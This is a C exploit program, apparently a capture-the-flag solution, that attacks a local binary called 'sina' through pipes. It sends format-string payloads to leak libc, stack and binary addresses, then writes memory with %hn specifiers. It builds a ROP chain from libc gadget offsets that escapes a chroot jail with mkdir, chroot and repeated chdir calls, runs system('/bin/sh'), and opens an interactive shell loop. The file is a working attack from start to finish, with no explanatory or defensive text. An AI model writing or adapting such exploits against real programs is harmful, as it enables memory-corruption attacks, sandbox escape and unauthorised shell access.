#define  _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/wait.h>
#include <time.h>

#define build(fmt, ...) nb = sprintf(payload, fmt __VA_OPT__(,) __VA_ARGS__); memset(payload + nb, 'A', 0x40 - nb); printf("[!] payload: %s\n", payload);

int send, recv;

int main(int argc, char **argv, char **envp) {
    int input[2], output[2];

    setbuf(stdout, NULL);
    setbuf(stdin, NULL);

    // pipe[0] in read end
    // pipe[1] in write end
    pipe(input);
    pipe(output);

    int pid = fork();
    if (pid == 0) {
        close(output[0]);
        dup2(output[1], 1);

        close(input[1]);
        dup2(input[0], 0);

        char *args[] = { "./sina", NULL };
        execve("./sina", args, envp);
        perror("execve");
    }

    // close(output[1]);
    // close(input[0]);
    // mkdir share && cp sina share/patch 

    send = input[1];
    recv = output[0];
    fcntl(recv, F_SETFL, fcntl(recv, F_GETFL) | O_NONBLOCK);
    printf("[!] fcntl: %d\n", fcntl(recv, F_SETPIPE_SZ, 1 << 20));

    int nb, dump;
    char *payload = malloc(0x50);
    dump = open("dump.dat", O_RDWR | O_CREAT, 0777);
    build("%%29$pZ%%30$pZ%%31$pZ%%219c%%32$hhn%%03831pZZ");
    write(send, payload, 0x40);

    sleep(2);
    printf("waiting: ");
    scanf("%c", &nb);

    char buf[4096];
    read(recv, buf, 4096);
    char *delim;
    char *start = buf;
    delim = strchr(start, 'Z');
    long libcbase = strtoul(start, NULL, 16) - 0x2d630;
    start = delim+1;
    delim = strchr(start, 'Z');
    long stack = strtoul(start, NULL, 16);
    start = delim+1;
    delim = strchr(start, 'Z');
    long filebase = strtoul(start, NULL, 16) - 0x3da8;

    printf("[!] stack: %p\r\n", stack);
    printf("[!] libcbase: %p\r\n", libcbase);
    printf("[!] filebase: %p\r\n", filebase);

    long retaddr = stack - 0x240;
    printf("[!] retaddr: %p\r\n", retaddr);

    payload = (char *)malloc(0x50);
    memset(payload, 0, 0x50);

    long offset = (filebase & 0xffff) - 0x5f;
    build("%%%dc%%10$hn%%%dp%%35$hn", offset, (-offset & 0xffff) + retaddr & 0xffff);
    write(send, payload, 0x40);

    long target = retaddr + 0x20;
    long poprdi = libcbase + 0x2dad2;
    long poprdx = libcbase + 0x1002c2;
    long victim = retaddr - 0x1000;//libcbase = 0x1f6700 + 0x800;//filebase + 0x4120;
    long ret = libcbase + 0x2d4b6;
    long poprsp = libcbase + 0x2d79b;
    long chdir = libcbase + 0xfe2f0;
    long mkdir = libcbase + 0xfd6d0;
    long strings = victim;
    long previous = victim;
    long fakedir = victim + 8;
    long current = victim + 16;
    long ropchain = current + 64;
    long system = libcbase + 0x4e510;
    long shell = libcbase + 0x1b413f;
    long chroot = libcbase + 0x103f80;
    long poprsi = libcbase + 0x2f2c1;
    long read = libcbase + 0xfda10;
    long entrypoint = libcbase + 0x2d740;
    long puts = libcbase + 0x79fa0;
    long wr = libcbase + 0xfdab0;

    long chain[512];
    int r = 0;
    chain[r++] = 0x2e2e;
    chain[r++] = 0x41424344;
    chain[r++] = 0x0a0a0d0a002e;

    chain[r++] = poprdi;
    chain[r++] = 1;
    chain[r++] = poprsi;
    chain[r++] = current;
    chain[r++] = poprdx;
    chain[r++] = 0x08;
    chain[r++] = wr;

    chain[r++] = poprdi;
    chain[r++] = 1;
    chain[r++] = poprsi;
    chain[r++] = previous;
    chain[r++] = poprdx;
    chain[r++] = 0x08;
    chain[r++] = wr;

    chain[r++] = poprdi;
    chain[r++] = fakedir;
    chain[r++] = poprsi;
    chain[r++] = 0777;
    chain[r++] = mkdir;

    chain[r++] = poprdi;
    chain[r++] = fakedir;
    chain[r++] = chroot;

    for (int i = 0; i < 24; i++) {
        chain[r++] = poprdi;
        chain[r++] = previous;
        chain[r++] = chdir;
    }

    chain[r++] = poprdi;
    chain[r++] = 1;
    chain[r++] = poprsi;
    chain[r++] = fakedir;
    chain[r++] = poprdx;
    chain[r++] = 0x08;
    chain[r++] = wr;

    chain[r++] = poprdi;
    chain[r++] = current;
    chain[r++] = chroot;

    chain[r++] = poprdi;
    chain[r++] = 1;
    chain[r++] = poprsi;
    chain[r++] = current;
    chain[r++] = poprdx;
    chain[r++] = 0x08;
    chain[r++] = wr;

    chain[r++] = poprdi;
    chain[r++] = shell;
    chain[r++] = system;
    chain[r++] = entrypoint;
    int chainlen = r * 8;

    long stub[128];
    r = 0;
    stub[r++] = poprdi;
    stub[r++] = 0;
    stub[r++] = poprsi;
    stub[r++] = victim;
    stub[r++] = poprdx;
    stub[r++] = chainlen;
    stub[r++] = read;
    stub[r++] = poprdx;
    stub[r++] = victim;
    stub[r++] = poprsp;
    stub[r++] = ropchain;
    char *raw = (char *)stub;

    for (int i = 0; i < r * 8; i++) {
        build("%%110p%%75$hhn%%%dp%%62$hn", (-0x6e & 0xffff) + (target & 0xffff));
        write(send, payload, 0x40);

        build("%%110p%%75$hhn%%%dp%%77$hhn", (-0x6e & 0xff) + raw[i]);
        write(send, payload, 0x40);

        target += 1;
    }

    build("%%157p%%75$hhn");
    write(send, payload, 0x40);

    printf("[!] chainlen: %d\n", chainlen);
    write(send, chain, chainlen);

    int failcount = 0;
    while (1) {
        nb = splice(recv, 0, 1, 0, 1 << 20, 0);
        if (nb < 0) {
            scanf("%c", &nb);
            failcount += 1;
            if (failcount > 16) break;
            printf("[!] fail (%05d)\n", failcount);
        } else {
            failcount = 0;
            printf("[!] num bytes: %d\n", nb);
        }
    }

    char command[0x1000];
    while (1) {
        printf("$ ");
        gets(command);
        command[strlen(command)] = '\n';
        write(send, command, strlen(command));
        int tries = 0;
        while (0 > splice(recv, 0, 1, 0, 1 << 20, 0) && tries < 1024) tries++;
    }
}